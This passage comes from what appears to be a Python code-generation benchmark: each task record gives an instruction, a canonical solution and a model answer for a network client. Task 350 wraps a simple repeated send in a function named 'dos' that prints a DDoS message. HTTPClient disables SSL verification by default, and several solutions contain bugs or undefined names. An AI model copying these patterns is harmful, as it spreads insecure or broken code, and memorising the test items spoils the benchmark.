    "Instruction": "Task Description: Implement a TCP client class for handling XDCC file downloads with progress tracking, speed calculation, and resumable download capabilities.\n\nClass Description: XDCCRequest is a class that manages file downloads over DCC (Direct Client-to-Client) protocol using TCP sockets. It provides functionality for establishing connections, downloading files with progress tracking, handling resumable downloads, and managing download speed calculations.\n\nAttributes:\n- proxies: dict - Proxy configuration for the connection\n- bucket: object - Rate limiting bucket for download speed control\n- fh: file object - File handle for writing downloaded data\n- dccsock: socket - TCP socket for DCC connection\n- filesize: int - Total size of the file being downloaded\n- received: int - Number of bytes received so far\n- speeds: list - List of recent download speeds (last three measurements)\n- sleep: float - Dynamic sleep interval for rate control\n- last_recv_size: int - Size of last received data chunk\n- send_64bits_ack: bool - Flag for using 64-bit ACK packets\n- abort: bool - Flag to indicate download abortion\n- status_notify: function - Callback for progress updates\n\nMethods:\n- create_socket() -> socket - Creates and returns a new TCP socket\n- _write_func(buf: bytes) -> None - Writes buffer to file with rate control\n- _send_ack() -> None - Sends acknowledgement of received bytes to server\n- download(ip: str, port: int, filename: str, status_notify: function=None, resume: function=None) -> str - Main download method\n- abort_downloads() -> None - Sets abort flag to stop current download\n- update_progress() -> None - Triggers progress notification callback\n- close() -> None - Cleanup method (currently empty)\n\nProperties:\n- size: int - Returns total file size\n- arrived: int - Returns bytes received so far\n- speed: int - Returns average download speed\n- percent: int - Returns download progress percentage",
    "Canonical_solution": "import errno\nimport os\nimport select\nimport socket\nimport struct\nimport time\n\nclass XDCCRequest:\n    def __init__(self, bucket=None, options={}):\n        self.proxies = options.get(\"proxies\", {})\n        self.bucket = bucket\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = [0, 0, 0]\n        self.sleep = 0.000\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        return sock\n\n    def _write_func(self, buf):\n        size = len(buf)\n        self.received += size\n        self.fh.write(buf)\n\n        if self.bucket:\n            time.sleep(self.bucket.consumed(size))\n        else:\n            if size < self.last_recv_size:\n                self.sleep += 0.002\n            else:\n                self.sleep *= 0.7\n            self.last_recv_size = size\n            time.sleep(self.sleep)\n\n    def _send_ack(self):\n        try:\n            self.dccsock.send(\n                struct.pack(\"!Q\" if self.send_64bits_ack else \"!I\", self.received)\n            )\n        except socket.error:\n            pass\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.send_64bits_ack = not self.filesize < 1 << 32\n        chunk_name = filename + \".chunk0\"\n\n        if resume and os.path.exists(chunk_name):\n            self.fh = open(chunk_name, mode=\"ab\")\n            resume_position = self.fh.tell()\n            if not resume_position:\n                resume_position = os.stat(chunk_name).st_size\n            resume_position = resume(resume_position)\n            self.fh.truncate(resume_position)\n            self.received = resume_position\n        else:\n            self.fh = open(chunk_name, mode=\"wb\")\n\n        last_update = time.time()\n        num_recv_len = 0\n        self.dccsock = self.create_socket()\n        recv_list = [self.dccsock]\n        self.dccsock.connect((ip, port))\n        self.dccsock.setblocking(False)\n\n        while True:\n            if self.abort:\n                self.dccsock.close()\n                self.fh.close()\n                raise Abort\n\n            fdset = select.select(recv_list, [], [], 0.1)\n            if self.dccsock in fdset[0]:\n                try:\n                    data = self.dccsock.recv(16384)\n                except socket.error as exc:\n                    if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):\n                        continue\n                    else:\n                        raise\n\n                data_len = len(data)\n                if data_len == 0 or self.received + data_len > self.filesize > 0:\n                    break\n\n                num_recv_len += data_len\n                self._write_func(data)\n                self._send_ack()\n\n            now = time.time()\n            timespan = now - last_update\n            if timespan > 1:\n                self.speeds[2] = self.speeds[1]\n                self.speeds[1] = self.speeds[0]\n                self.speeds[0] = num_recv_len // timespan\n                num_recv_len = 0\n                last_update = now\n                self.update_progress()\n\n        self.dccsock.close()\n        self.fh.close()\n        os.rename(chunk_name, filename)\n        return filename\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.status_notify:\n            self.status_notify({\"progress\": self.percent})\n\n    @property\n    def size(self):\n        return self.filesize\n\n    @property\n    def arrived(self):\n        return self.received\n\n    @property\n    def speed(self):\n        speeds = [x for x in self.speeds if x]\n        return sum(speeds) // len(speeds)\n\n    @property\n    def percent(self):\n        if not self.filesize:\n            return 0\n        return (self.received * 100) // self.filesize\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\nimport os\nfrom typing import Optional, Callable, Dict\n\nclass XDCCRequest:\n    def __init__(self, proxies: dict = None):\n        self.proxies = proxies\n        self.bucket = None\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = [0] * 3\n        self.sleep = 0.0\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self) -> socket.socket:\n        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def _write_func(self, buf: bytes) -> None:\n        self.fh.write(buf)\n        self.received += len(buf)\n        self.last_recv_size = len(buf)\n        self.update_progress()\n\n        if self.bucket:\n            now = time.time()\n            while self.bucket.get_tokens(1) < 1:\n                time.sleep(0.1)\n            self.bucket.consume(1)\n\n    def _send_ack(self) -> None:\n        if self.send_64bits_ack:\n            ack = (self.received).to_bytes(8, 'big', signed=True)\n        else:\n            ack = (self.received).to_bytes(4, 'big', signed=True)\n        self.dccsock.sendall(ack)\n\n    def download(self, ip: str, port: int, filename: str, status_notify: Optional[Callable] = None, resume: Optional[Callable] = None) -> str:\n        self.abort = False\n        self.status_notify = status_notify\n        \n        # Resume logic\n        if resume and os.path.exists(filename):\n            try:\n                self.received = resume(filename)\n                self.fh = open(filename, 'ab')\n            except Exception as e:\n                self.fh = open(filename, 'wb')\n                self.received = 0\n        else:\n            self.fh = open(filename, 'wb')\n        \n        try:\n            self.dccsock = self.create_socket()\n            self.dccsock.connect((ip, port))\n            \n            if self.received > 0:\n                # Send resume position\n                if self.send_64bits_ack:\n                    ack = (self.received).to_bytes(8, 'big', signed=True)\n                else:\n                    ack = (self.received).to_bytes(4, 'big', signed=True)\n                self.dccsock.sendall(ack)\n            \n            start_time = time.time()\n            last_update = start_time\n            \n            while not self.abort:\n                buf = self.dccsock.recv(4096)\n                if not buf:\n                    break\n                \n                self._write_func(buf)\n                self._send_ack()\n                \n                # Speed calculation\n                now = time.time()\n                elapsed = now - last_update\n                if elapsed >= 1.0:\n                    speed = self.received // now - start_time\n                    self.speeds.pop(0)\n                    self.speeds.append(speed)\n                    last_update = now\n                \n                if self.sleep > 0:\n                    time.sleep(self.sleep)\n            \n            self.fh.close()\n            return filename\n            \n        except Exception as e:\n            # Handle errors, potentially delete corrupted file\n            self.fh.close()\n            if os.path.exists(filename):\n                os.remove(filename)\n            raise\n        finally:\n            self.abort = False\n\n    def abort_downloads(self) -> None:\n        self.abort = True\n\n    def update_progress(self) -> None:\n        if self.status_notify:\n            progress_data = {\n                'received': self.received,\n                'filesize': self.filesize,\n                'speed': self.speed,\n                'percent': self.percent\n            }\n            self.status_notify(progress_data)\n\n    def close(self) -> None:\n        pass\n\n    @property\n    def size(self) -> int:\n        return self.filesize\n\n    @property\n    def arrived(self) -> int:\n        return self.received\n\n    @property\n    def speed(self) -> int:\n        return sum(self.speeds) // len(self.speeds) if any(self.speeds) else 0\n\n    @property\n    def percent(self) -> int:\n        if self.filesize <= 0:\n            return 0\n        return min(int(self.received * 100 / self.filesize), 100)"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "right_result": "import requests\nimport httpx\nfrom typing import Optional, Tuple\n\nclass HTTPClient:\n    def __init__(self):\n        self.header = {'User-Agent': 'PythonHTTPClient/1.0'}\n        self.verify = False\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        try:\n            response = requests.get(url, headers=self.header, verify=self.verify)\n            response.raise_for_status()\n            from bs4 import BeautifulSoup\n            soup = BeautifulSoup(response.text, 'html.parser')\n            title = soup.title.string if soup.title else 'No Title'\n            return (title, url)\n        except Exception:\n            return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        return requests.get(url, headers=self.header, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host and port, sends a message multiple times, and handles potential connection errors.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, sends a specified message multiple times (including one sendto operation), and properly closes the connection. It includes error handling for connection failures and provides status messages about the operation.\n\nInput:\n- host: str - The target server's IP address or hostname\n- port: int - The target port number to connect to\n- message: bytes - The message to be sent to the server (should be in bytes format)\n\nOutput:\n- None (prints status messages to console)\n- Returns None implicitly\n- Side effect: Sends network packets to the specified host and port",
    "Canonical_solution": "import socket\n\ndef dos(host, port, message):\n    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        ddos.connect((host, port))\n        ddos.send(message)\n        ddos.sendto(message, (host, port))\n        ddos.send(message)\n    except socket.error as msg:\n        print(\"|[Connection Failed]         |\")\n    print(\"|[DDoS Attack Engaged]       |\")\n    ddos.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef send_messages_tcp(host, port, message):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(5)\n            print(f\"Connecting to {host}:{port}...\")\n            s.connect((host, port))\n            print(\"Connected successfully.\")\n\n            for i in range(3):\n                if i == 1:\n                    s.sendto(message + b'_sendto', (host, port))\n                    print(f\"Sent (sendto): {message + b'_sendto'}\")\n                else:\n                    s.sendall(message + f'_send{i}'.encode())\n                    print(f\"Sent (send{i}): {message + f'_send{i}'.encode()}\")\n\n            print(\"Messages sent successfully.\")\n    except socket.timeout:\n        print(\"Connection timed out.\")\n    except ConnectionRefusedError:\n        print(\"Connection refused by the server.\")\n    except socket.gaierror:\n        print(\"Hostname could not be resolved.\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n    finally:\n        print(\"Connection closed.\")"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a TCP client class in Python that establishes a connection to a server, sends data with length prefixing, and properly closes the connection.\n\nClass Description: BaseSocketClient is a TCP client implementation that handles socket creation, connection management, and data transmission with length-prefixed messages. It supports both simple and detected encoding modes for data transmission.\n\nAttributes:\n- s: [socket.socket] - The underlying TCP socket object used for communication\n\nMethods:\n- __init__(host: str, port: int) -> None - Initializes the client and establishes a connection to the specified host and port. If host is 'auto', uses the local hostname.\n- send(data: Any) -> None - Sends data to the server after encoding detection, prefixing the message with its length in bytes.\n- send_smpl(data: Any) -> None - Sends data to the server using simple encoding, prefixing the message with its length in bytes.\n- close() -> None - Closes the connection with the server.",
    "Canonical_solution": "import socket\n\nclass BaseSocketClient:\n    def __init__(self, host, port) -> None:\n        if host == 'auto':\n            host = socket.gethostname()\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        self.s = s\n    \n    def send(self, data):\n        val = encode_detect(data)\n        self.s.send(bytes('{}\\n'.format(len(val)), 'ascii'))\n        self.s.sendall(val)\n    \n    def send_smpl(self, data):\n        val = encode_smpl(data)\n        self.s.send(bytes('{}\\n'.format(len(val)), 'ascii'))\n        self.s.sendall(val)\n    \n    def close(self):\n        self.s.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport struct\nimport pickle\n\n\nclass BaseSocketClient:\n    def __init__(self, host: str, port: int) -> None:\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        if host == 'auto':\n            host = socket.gethostname()\n        self.s.connect((host, port))\n\n    def send(self, data: any) -> None:\n        encoded_data = pickle.dumps(data)\n        length = len(encoded_data)\n        self.s.sendall(struct.pack('!I', length) + encoded_data)\n\n    def send_smpl(self, data: any) -> None:\n        encoded_data = str(data).encode('utf-8')\n        length = len(encoded_data)\n        self.s.sendall(struct.pack('!I', length) + encoded_data)\n\n    def close(self) -> None:\n        self.s.close()"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Implement a TCP client class in Python that handles secure connections, message synchronization, and various types of message exchanges with a server.\n\nClass Description: The Client class represents a TCP client that connects to a server, authenticates, sends and receives messages, and handles message synchronization. It supports both plain and SSL-encrypted connections.\n\nAttributes:\n- seq: [int] - Sequence number for message tracking\n- sock: [socket.socket] - Socket object for server communication\n- sync_key: [int] - Current synchronization key\n- syncing: [bool] - Flag indicating if synchronization is in progress\n- sync_timestamp: [int] - Timestamp of last synchronization attempt\n- next_sync_key: [int] - Next synchronization key to use\n\nMethods:\n- __init__() -> [None] - Initializes the client with default values\n- connect_server(device_id: str, token: str, host: str=None, port: int=24430, use_ssl: bool=True) -> [bool] - Connects to the server, authenticates using device ID and token, and returns connection status\n- close() -> [None] - Closes the connection with the server\n- recv_message() -> [tuple] - Receives messages from server and handles timeouts with ping messages\n- handle_message(cmd: int, s: int, m: any) -> [None] - Handles different types of incoming messages and triggers appropriate actions\n- ack_message(s: int) -> [None] - Sends acknowledgment for received messages\n- send_peer_message(msg: any) -> [None] - Sends a peer-to-peer message to the server\n- send_group_message(msg: any) -> [None] - Sends a group message to the server\n- send_sync() -> [None] - Initiates synchronization with the server\n- send_sync_key() -> [None] - Sends current synchronization key to the server",
    "Canonical_solution": "import struct\nimport socket\nimport select\nimport ssl\n\nclass Client:\n    def __init__(self):\n        self.seq = 0\n        self.sock = None\n        self.sync_key = 0\n        self.syncing = False\n        self.sync_timestamp = 0\n        self.next_sync_key = 0\n\n    def connect_server(self, device_id, token, host=None, port=24430, use_ssl=True):\n        address = (host if host else \"imnode2.gobelieve.io\", port)\n        if use_ssl:\n            sock_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            context = ssl.create_default_context()\n            sock = context.wrap_socket(sock_fd, server_hostname=address[0])\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            \n        sock.connect(address)\n        auth = AuthenticationToken()\n        auth.token = token\n        auth.device_id = device_id\n        self.seq = self.seq + 1\n        send_message(MSG_AUTH_TOKEN, self.seq, auth, sock)\n        cmd, _, _, msg = recv_message(sock)\n        if cmd != MSG_AUTH_STATUS or msg != 0:\n            return False\n\n        self.sock = sock\n        return True\n\n    def close(self):\n        if self.sock:\n            self.sock.close()\n\n    def recv_message(self):\n        while True:\n            rlist, _, xlist = select.select([self.sock], [], [self.sock], 60)\n            if not rlist and not xlist:\n                self.seq += 1\n                send_message(MSG_PING, self.seq, None, self.sock)\n                continue\n            if xlist:\n                return 0, 0, None\n            if rlist:\n                cmd, s, _, m = recv_message(self.sock)\n                self.handle_message(cmd, s, m)\n                return cmd, s, m\n\n    def handle_message(self, cmd, s, m):\n        if cmd == MSG_IM:\n            self.ack_message(s)\n        elif cmd == MSG_GROUP_IM:\n            self.ack_message(s)\n        elif cmd == MSG_SYSTEM:\n            self.ack_message(s)\n        elif cmd == MSG_SYNC_NOTIFY:\n            new_sync_key = m\n            now = int(time.time())\n            if new_sync_key > self.sync_key and (not self.syncing or now - self.sync_timestamp > 3):\n                self.send_sync()\n                self.syncing = True\n                self.sync_timestamp = int(time.time())\n            elif new_sync_key > self.next_sync_key:\n                self.next_sync_key = new_sync_key\n        elif cmd == MSG_SYNC_END:\n            new_sync_key = m\n            if new_sync_key > self.sync_key:\n                self.sync_key = new_sync_key\n                self.send_sync_key()\n            self.syncing = False\n            if self.next_sync_key > self.sync_key:\n                self.send_sync()\n                self.syncing = True\n                self.sync_timestamp = int(time.time())\n                self.next_sync_key = 0\n\n    def ack_message(self, s):\n        self.seq += 1\n        send_message(MSG_ACK, self.seq, s, self.sock)\n\n    def send_peer_message(self, msg):\n        self.seq += 1\n        send_message(MSG_IM, self.seq, msg, self.sock)\n\n    def send_group_message(self, msg):\n        self.seq += 1\n        send_message(MSG_GROUP_IM, self.seq, msg, self.sock)\n\n    def send_sync(self):\n        self.seq += 1\n        send_message(MSG_SYNC, self.seq, self.sync_key, self.sock)\n\n    def send_sync_key(self):\n        self.seq += 1\n        send_message(MSG_SYNC_KEY, self.seq, self.sync_key, self.sock)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport ssl\nimport struct\nimport time\nimport json\nfrom typing import Optional, Tuple, Any\n\nclass Client:\n    def __init__(self):\n        self.seq = 0\n        self.sock: Optional[socket.socket] = None\n        self.sync_key = 0\n        self.syncing = False\n        self.sync_timestamp = 0\n        self.next_sync_key = 0\n\n    def connect_server(self, device_id: str, token: str, host: str = \"localhost\", port: int = 24430, use_ssl: bool = True) -> bool:\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            if use_ssl:\n                context = ssl.create_default_context()\n                self.sock = context.wrap_socket(self.sock, server_hostname=host)\n            self.sock.connect((host, port))\n            \n            auth_data = json.dumps({\"device_id\": device_id, \"token\": token}).encode()\n            self.sock.sendall(struct.pack(\"!I\", len(auth_data)) + auth_data)\n            \n            response_len = struct.unpack(\"!I\", self.sock.recv(4))[0]\n            response = self.sock.recv(response_len).decode()\n            auth_response = json.loads(response)\n            \n            if auth_response.get(\"status\") == \"success\":\n                return True\n            else:\n                self.close()\n                return False\n        except Exception:\n            self.close()\n            return False\n\n    def close(self) -> None:\n        if self.sock:\n            try:\n                self.sock.shutdown(socket.SHUT_RDWR)\n            except:\n                pass\n            self.sock.close()\n            self.sock = None\n\n    def recv_message(self) -> Tuple[int, int, Any]:\n        try:\n            header = self.sock.recv(8)\n            if not header:\n                raise ConnectionError(\"Connection closed by server\")\n            \n            cmd, s = struct.unpack(\"!II\", header)\n            \n            payload_len = struct.unpack(\"!I\", self.sock.recv(4))[0]\n            payload = self.sock.recv(payload_len)\n            \n            if cmd == 0x01:  # Ping message\n                return (cmd, s, None)\n            \n            try:\n                message = json.loads(payload.decode())\n            except json.JSONDecodeError:\n                message = payload\n                \n            return (cmd, s, message)\n        except socket.timeout:\n            self.send_message(0x01, {})  # Send ping if timeout occurs\n            raise\n\n    def handle_message(self, cmd: int, s: int, m: Any) -> None:\n        if cmd == 0x02:  # Acknowledgment\n            pass\n        elif cmd == 0x03:  # Synchronization request\n            self.send_sync_key()\n        elif cmd == 0x04:  # Sync key update\n            if isinstance(m, dict) and 'sync_key' in m:\n                self.sync_key = m['sync_key']\n                self.ack_message(s)\n        elif cmd == 0x05:  # Peer message\n            self.ack_message(s)\n        elif cmd == 0x06:  # Group message\n            self.ack_message(s)\n        elif cmd == 0x07:  # Error message\n            pass\n\n    def ack_message(self, s: int) -> None:\n        ack_payload = json.dumps({\"ack\": s}).encode()\n        self.sock.sendall(struct.pack(\"!II\", 0x02, s) + struct.pack(\"!I\", len(ack_payload)) + ack_payload)\n\n    def send_message(self, cmd: int, payload: Any) -> None:\n        self.seq += 1\n        seq_num = self.seq\n        \n        if isinstance(payload, dict):\n            payload_data = json.dumps(payload).encode()\n        else:\n            payload_data = str(payload).encode()\n        \n        header = struct.pack(\"!III\", cmd, seq_num, len(payload_data))\n        self.sock.sendall(header + payload_data)\n\n    def send_peer_message(self, msg: Any) -> None:\n        self.send_message(0x05, {\"message\": msg})\n\n    def send_group_message(self, msg: Any) -> None:\n        self.send_message(0x06, {\"message\": msg})\n\n    def send_sync(self) -> None:\n        self.syncing = True\n        self.sync_timestamp = int(time.time())\n        self.next_sync_key = self.sync_key + 1\n        self.send_message(0x03, {\"sync_key\": self.next_sync_key})\n        self.syncing = False\n\n    def send_sync_key(self) -> None:\n        self.send_message(0x04, {\"sync_key\": self.sync_key})"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Implement a TCP client for Remote Console (RCon) protocol communication, which allows sending commands to a game server and receiving responses. The implementation should handle connection establishment, command sending, response receiving, and error handling.\n\nClass Description: RConConnection is a class that manages the connection to an RCon server, handles authentication, and provides methods to send commands and receive responses. It includes error handling for various RCon protocol scenarios.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object used for communication with the RCon server\n- rid: [int] - The current request ID used for tracking requests and responses\n\nMethods:\n- __init__(target: str, port: int) -> None - Initializes the RCon connection by creating a TCP socket and connecting to the specified target and port\n- send(t: int, payload: str) -> bytes - Sends an RCon packet with the specified type and payload, waits for and returns the response data\n- login(password: str) -> None - Authenticates with the RCon server using the provided password (uses send with type 3)\n- command(com: str, args: str) -> None - Sends a command to the RCon server (uses send with type 2)\n- close() -> None - Closes the connection to the RCon server",
    "Canonical_solution": "import socket\nimport struct\nimport select\n\nclass RConException(Exception):\n    def __init__(self, request_id, reason):\n        self.request_id = request_id\n        self.reason = reason\n\n    def __str__(self):\n        return (\"Failed RCon request with request ID %d, reason %s\" %\n                (self.request_id, self.reason))\n\nclass RConConnection:\n    def __init__(self, target, port):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((target, port))\n        self.rid = 0\n\n    def send(self, t, payload):\n        self.rid = self.rid + 1\n        pld_enc = payload.encode(\"utf-8\")\n        header = struct.pack(\"<iii\",\n                             len(pld_enc) + 4 + 4 + 2,  # rid, type and padding\n                             self.rid, t)\n        data = header + pld_enc + b'\\x00\\x00'\n        self.sock.send(data)\n\n        toread = select.select([self.sock], [], [], 30)\n\n        if not toread:\n            raise RConException(self.rid, \"Request timed out.\")\n\n        try:\n            res_len, res_id, res_type = \\\n                struct.unpack(\"<iii\", self.sock.recv(12, socket.MSG_WAITALL))\n            if res_len < 0:\n                raise Exception(\"Response length is {}.\".format(res_len))\n\n        except Exception as e:\n            raise RConException(self.rid,\n                                \"RCon protocol error. Are you sure you're \"\n                                \"talking to the RCon port? Error: %s\" % e)\n        res_data = self.sock.recv(res_len - 4 - 4)\n        res_data = res_data[:-2]\n\n        if res_id == -1:\n            if t == 3:\n                raise RConException(self.rid, \"Login failed.\")\n            else:\n                raise RConException(self.rid,\n                                    \"Request failed due to invalid login.\")\n        elif res_id != self.rid:\n            raise RConException(self.rid, \"Received unexpected response \"\n                                \"number: %d\" % res_id)\n        return res_data\n\n    def login(self, password):\n        self.send(3, password)\n\n    def command(self, com, args):\n        self.send(2, com + \" \" + args)\n\n    def close(self):\n        self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport struct\n\nclass RConConnection:\n    def __init__(self, target: str, port: int) -> None:\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(5)\n        try:\n            self.sock.connect((target, port))\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to connect to {target}:{port}: {e}\")\n        self.rid = 0\n\n    def send(self, t: int, payload: str) -> bytes:\n        if not isinstance(t, int) or not isinstance(payload, str):\n            raise ValueError(\"Invalid parameter types for send\")\n        \n        encoded = payload.encode('utf-8')\n        size = len(encoded)\n        packet = struct.pack('<iii', self.rid, t, size) + encoded\n        try:\n            self.sock.sendall(packet)\n            header = self.sock.recv(12)\n            if not header:\n                raise ConnectionError(\"Empty response from server\")\n            rid, rtype, rsize = struct.unpack('<iii', header)\n            if rid != self.rid:\n                raise ValueError(\"Response ID mismatch\")\n            if rtype not in [0, 2, 3]:\n                raise ValueError(f\"Unexpected response type: {rtype}\")\n            response = b''\n            while len(response) < rsize:\n                chunk = self.sock.recv(rsize - len(response))\n                if not chunk:\n                    break\n                response += chunk\n            self.rid += 1\n            return response\n        except socket.error as e:\n            raise IOError(f\"Communication error: {e}\")\n\n    def login(self, password: str) -> None:\n        if not isinstance(password, str):\n            raise ValueError(\"Password must be a string\")\n        response = self.send(3, f\"rcon_password {password}\")\n        if b'failed' in response.lower():\n            raise PermissionError(\"Authentication failed\")\n\n    def command(self, com: str, args: str) -> None:\n        if not isinstance(com, str) or not isinstance(args, str):\n            raise ValueError(\"Command and arguments must be strings\")\n        full_command = f\"{com} {args}\" if args else com\n        self.send(2, full_command)\n\n    def close(self) -> None:\n        try:\n            self.sock.shutdown(socket.SHUT_RDWR)\n        except socket.error:\n            pass\n        self.sock.close()"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a JSON-formatted command with arguments, receives the server's response, and then closes the connection.\n\nFunction Description: The function `connect_client` creates a TCP socket, connects to a specified server, sends a command with arguments in JSON format, waits for and prints the server's response, and finally closes the socket connection.\n\nInput:\n- `machine` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `blendpath` (str): A file path or identifier to be included in the command arguments.\n- `obj_num` (int): A numerical argument to be included in the command arguments.\n\nOutput:\n- The function does not return any value but prints the server's response to the console.",
    "Canonical_solution": "import socket, json\n\ndef connect_client(machine, port, blendpath, obj_num):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((machine, port))\n    args = [blendpath, obj_num]\n    command = json.dumps({'call':1, 'command':1, 'args':args})\n    sock.send((command).encode())\n    response_data = sock.recv(1024)\n    print(response_data.decode())\n    sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport json\n\ndef connect_client(machine, port, blendpath, obj_num):\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect((machine, port))\n    command = {\n        \"command\": \"process\",\n        \"arguments\": {\n            \"blendpath\": blendpath,\n            \"obj_num\": obj_num\n        }\n    }\n    client_socket.sendall(json.dumps(command).encode('utf-8'))\n    response = client_socket.recv(4096).decode('utf-8')\n    print(response)\n    client_socket.close()"
  },
  {
    "Task_id": 359,
    "Instruction": "Task Description: Create a threaded TCP client socket class that handles bidirectional communication with a remote server, managing both sending and receiving data through queues while running in a separate thread.\n\nClass Description: ThreadedTCPClientSocket is a threading-based TCP client that establishes a connection to a specified server, sends data from a queue to the server, and puts received data into another queue. It uses non-blocking operations with select() for efficient I/O handling.\n\nAttributes:\n- ip: str - The IP address of the target server\n- port: int - The port number of the target server\n- listener_q: queue.Queue - Queue for storing received data from the server\n- remote_q: queue.Queue - Queue for storing data to be sent to the server\n- config: dict - Configuration parameters for the client\n- logger: logging.Logger - Logger object for debugging and error messages\n- sock: socket.socket - The TCP socket object for communication\n\nMethods:\n- __init__(ip, port, listener_q, remote_q, config, log) -> None - Initializes the client with connection parameters and queues\n- connect() -> int - Establishes connection to the server and returns the local port number (None if failed)\n- run() -> None - Main thread loop handling send/receive operations using select()",
